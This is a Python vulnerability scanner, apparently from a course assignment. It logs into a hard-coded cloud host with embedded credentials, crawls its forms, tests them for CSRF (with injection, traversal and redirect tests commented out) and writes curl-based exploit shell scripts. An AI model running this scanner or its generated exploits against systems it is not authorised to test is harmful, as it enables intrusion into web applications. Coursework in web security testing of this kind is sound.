from html.parser import HTMLParser  
from urllib.request import urlopen  
from urllib import parse

from crawlerhttp import CrawlerHttp, CrawlerHttpResponse, CrawlerHttpInput, CrawlerHttpSubmission, CrawlerHttpForm
from attacker import attack, attack_sqli, attack_csrf

from bs4 import BeautifulSoup

import json
import copy

#attackURL = "http://192.168.1.81/Assignment2/"    #A2 website
attackURL = "http://ec2-52-221-235-123.ap-southeast-1.compute.amazonaws.com:8081"                   #A3 website
maxIteration = 100

##### LOGIN related #####
loginURL = "http://ec2-52-221-235-123.ap-southeast-1.compute.amazonaws.com:8081"
_loginEnabled = True
usernameKey = 'username'
usernameValue = 'morty'
passwordKey = 'password'
passwordValue = 'QNKCDZO'

crawler = CrawlerHttp()

def login (url):
    from requests import session

    payload = {
        usernameKey: usernameValue,
        passwordKey: passwordValue
    }

    with session() as c:
        response = c.post(url, data=payload)
        ##response = c.get(url)

        #print(response.headers)
        #print(response.text)

        #Assign cookie to session
        crawler.cookiejar = response.cookies._cookies  #dict #RequestsCookieJar
        crawler.h.cookies = response.cookies

def spider(url, iteration):

    pagesToVisit = [url]
    pagesVisited = []
    numberVisited = 0
    crawledPages = []

    while pagesToVisit != []:
        url = pagesToVisit[0]
        pagesToVisit = pagesToVisit[1:]

        if url not in pagesVisited:
            numberVisited = numberVisited +1
            try:
                crawledDocument = crawler.send(url)
                links = crawledDocument.getLink()

                if numberVisited < iteration:
                    pagesToVisit = sorted(list(set(pagesToVisit + links)))

                pagesVisited = pagesVisited + [url]
                crawledPages = crawledPages + [crawledDocument]
            except Exception as e:
                print(" **Failed!**")
                print(e)
    return crawledPages

## login
if _loginEnabled:
    login(loginURL)

pages = spider(attackURL, maxIteration)

def formatData(data, length):
    dataString = str(data)
    dataLengthFormat = "{:<" + str(length) + "}"
    return dataLengthFormat.format(dataString[:length])

def getInputName(input_result_set):
    input_array = []
    for x in input_result_set:
        if x.has_attr("name"):
            input_obj = { "name": x.attrs["name"] }
            if x.has_attr("value"):
                input_obj["value"] = x.attrs["value"]
            input_array.append(input_obj)
    return input_array

def getFormData(form_result_set):
    form_array = []
    for x in form_result_set:
        form_obj = {}
        if x.has_attr("action"):
            form_obj["action"] = x["action"]
        if x.has_attr("method"):
            form_obj["method"] = x["method"]
        input_result_set = x.find_all("input")
        form_obj["input"] = getInputName(input_result_set)

        form_array.append(form_obj)

    return form_array

def generateScript(data):
    script = []
    for submission in data:
        baseUrl = submission.baseUrl
        method = submission.method
        endpoint = submission.path
        param = submission.data
        paramStr = ""
        if isinstance(param,str) == False:
            tempArr = []
            for key in param:
                tempArr.append(key + "=" + param[key])
            paramStr = '&'.join(tempArr)
        else:
            paramStr = param
                
        if method.upper() == "POST":
            script.append("curl -d '" + paramStr + "' " + baseUrl + endpoint)
        else:
            if isinstance(param,str) == False:
                script.append("curl -G '" + baseUrl + endpoint + "' --data-urlencode '" + paramStr + "'")
            else:
                script.append("curl " + baseUrl + endpoint + "?" + paramStr)

    return '\n'.join(script)

##################################################
#Attack Script With a new pop up window in Ubuntu#
##################################################

def generateScriptNewWindow(data):
    script = []
    for submission in data:
        baseUrl = submission.baseUrl
        method = submission.method
        endpoint = submission.path
        param = submission.data
        paramStr = ""
        if isinstance(param,str) == False:
            tempArr = []
            for key in param:
                tempArr.append(key + "=" + param[key])
            paramStr = '&'.join(tempArr)
        else:
            paramStr = param
                
        if method.upper() == "POST":
            script.append("tmp=$(tempfile --suffix .html)\ncurl -d '" + paramStr + "' " + baseUrl + endpoint+ " > $tmp\nxdg-open $tmp")
        else:
            if isinstance(param,str) == False:
                script.append("tmp=$(tempfile --suffix .html)\ncurl -G '" + baseUrl + endpoint + "' --data-urlencode '" + paramStr + "' > $tmp\nxdg-open $tmp")
            else:
                script.append("tmp=$(tempfile --suffix .html)\ncurl " + baseUrl + endpoint + "?" + paramStr + " > $tmp\nxdg-open $tmp")

    return '\n'.join(script)


def generateCSRFScriptNewWindow(json):
    script = []

    for attack in json['results'][attackURL]:

        cookieReadCommand = ""

        if _loginEnabled:
            ## In case a login is required during the assessment
            loginStr = usernameKey + "=" + usernameValue + "&" + passwordKey + "=" + passwordValue
            cookieName = '~/loginCookie.txt'
            cookieCreateCommand = '-c ' + cookieName + " "
            cookieReadCommand = '-b ' + cookieName + " "

            script.append(
                "curl -c " + cookieName + " -X POST -d '" + loginStr + "' " + loginURL)


        method = attack['action']['method']
        param = attack['action']['params']
        tempArr = []
        for key in param:
            tempArr.append(key + "=" + param[key])
        paramStr = '&'.join(tempArr)

        endpoint = attack['action']['endpoint']

        if method.lower() == "post":
            script.append(
                "tmp=$(tempfile --suffix .html)\ncurl " + cookieReadCommand + "-X POST -d '" + paramStr + "' " + attackURL + endpoint + " > $tmp\nxdg-open $tmp \n")

        # method = attack['form_page']['method']
        # param =  attack['form_page']['params']
        # tempArr = []
        # for key in param:
        #     tempArr.append(key + "=" + param[key])
        # paramStr = '&'.join(tempArr)
        #
        # if method.lower() == "get":
        #     tempArr = []
        #     for key in param:
        #         tempArr.append(key + "=" + param[key])
        #     paramStr = '&'.join(tempArr)
        #
        #     endpoint = attack['form_page']['endpoint']
        #
        #     if (len(paramStr) == 0):
        #         script.append(
        #             "curl " + cookieReadCommand + "-G " + attackURL + endpoint + " > $tmp\nxdg-open $tmp \n")
        #
        #     else:
        #         script.append(
        #             "curl " + cookieReadCommand + "-G " + attackURL + endpoint + " --data-urlencode '" + paramStr + "' > $tmp\nxdg-open $tmp \n")


    return '\n'.join(script)

result_array = []
allSubmissions = []

for page in pages:
    forms = page.getSubmission()
    allSubmissions = allSubmissions + forms
    formJson = []
    for submission in forms:
        formJson = formJson + [submission.json()]
        
    if(len(formJson) > 0):
        data = {
            "url": page.url,
            "form": formJson
        }
        result_array.append(data)
    
with open('crawler_output.json', 'w') as outfile:  
    json.dump(result_array, outfile, indent=4)

def formatJson(title, data):
    resultJson = {}
    resultJsonResults = {}

    for submission in data:
        if not submission.baseUrl in resultJsonResults:
            resultJsonResults[submission.baseUrl] = []
        
        submissionJson = {}
        submissionJson["method"] = submission.method
        submissionJson["params"] = submission.data
        submissionJson["endpoint"] = submission.path

        resultJsonResults[submission.baseUrl] = resultJsonResults[submission.baseUrl] + [submissionJson]

    resultJson["results"] = resultJsonResults
    resultJson["class"] = title
    return resultJson


def formatCSRFJson(title, results):
    resultJson = {}
    resultJsonResults = {}
    actionJsonResults = {}



    resultJsonResults[attackURL] = []

    for result in results:

        # for action
        actionJsonResults['action'] = {}
        # for form_page
        actionJsonResults['form_page'] = {}
        for form in result:

            # form_page
            if isinstance(form, CrawlerHttpResponse):
                submissionJson = {}

                submissionJson["method"] = form.resp.request.method
                submissionJson["params"] = form.getParameter()
                submissionJson["endpoint"] = form.resp.request.path_url.split('?')[0]  # remove parameters from URL
                formID = ""
                #if ('id' in form.getForm()[0].dom.attrs):
                #    formID = form.getForm()[0].dom.attrs['id']
                #if ('ID' in form.getForm()[0].dom.attrs):
                #    formID = form.getForm()[0].dom.attrs['ID']

                submissionJson["form_id"] = formID

                actionJsonResults['form_page'] = submissionJson



            else:


                #action
                submissionJson = {}
                submissionJson["method"] = form.method
                submissionJson["params"] = form.data
                submissionJson["endpoint"] = form.url.split(attackURL)[1]
                actionJsonResults['action'] = submissionJson

                #resultJsonResults[attackURL] = resultJsonResults[attackURL] + [actionJsonResults]
        tempActionJsonResult = copy.deepcopy(actionJsonResults)
        resultJsonResults[attackURL] = resultJsonResults[attackURL] + [tempActionJsonResult]

    resultJson["results"]  =resultJsonResults
    resultJson["class"] = title
    return resultJson

# attackResult = attack(allSubmissions, "servercodeinjection.txt", "servercodeinjectionexpected.txt")
# resultjson = formatJson("Server Side Code Injection", attackResult)
# with open('result_server_code_injection.json', 'w') as outfile:
#     json.dump(resultjson, outfile, indent=4)
# with open('exploit_server_code_injection.sh', 'w') as outfile:
#     script=generateScriptNewWindow(attackResult)
#     outfile.write(script)
#
# attackResult = attack(allSubmissions, "unvalidatedredirect.txt", "unvalidatedredirectexpected.txt", checkRedirect=True)
# resultjson = formatJson("Open Redirect", attackResult)
# with open('result_open_redirect.json', 'w') as outfile:
#     json.dump(resultjson, outfile, indent=4)
# with open('exploit_open_redirect.sh', 'w') as outfile:
#     script=generateScriptNewWindow(attackResult)
#     outfile.write(script)
#
# attackResult = attack(allSubmissions, "directorytraversal.txt", "directorytraversalexpected.txt")
# resultjson = formatJson("Directory Traversal", attackResult)
# with open('result_directory_traversal.json', 'w') as outfile:
#     json.dump(resultjson, outfile, indent=4)
# with open('exploit_directory_traversal.sh', 'w') as outfile:
#     script=generateScriptNewWindow(attackResult)
#     outfile.write(script)
#
# attackResult = attack(allSubmissions, "shellcommandinjection.txt", "shellcommandinjectionexpected.txt")
# resultjson = formatJson("Shell Command Injection", attackResult)
# with open('result_shell_command_injection.json', 'w') as outfile:
#     json.dump(resultjson, outfile, indent=4)
# with open('exploit_shell_command_injection.sh', 'w') as outfile:
#     script=generateScriptNewWindow(attackResult)
#     outfile.write(script)
#
#
# attackResult = attack_sqli(allSubmissions, "sqlinjection.txt", "sqlinjectionexpected.txt")
# resultjson = formatJson("SQL Injection", attackResult)
# with open('result_sql_injection.json', 'w') as outfile:
#     json.dump(resultjson, outfile, indent=4)


attackResult = attack_csrf(crawler, pages, allSubmissions)
resultjson = formatCSRFJson("CSRF", attackResult)
with open('result_csrf.json', 'w') as outfile:
    json.dump(resultjson, outfile, indent=4)
with open('exploit_csrf.sh', 'w') as outfile:
    script=generateCSRFScriptNewWindow(resultjson)
    outfile.write(script)
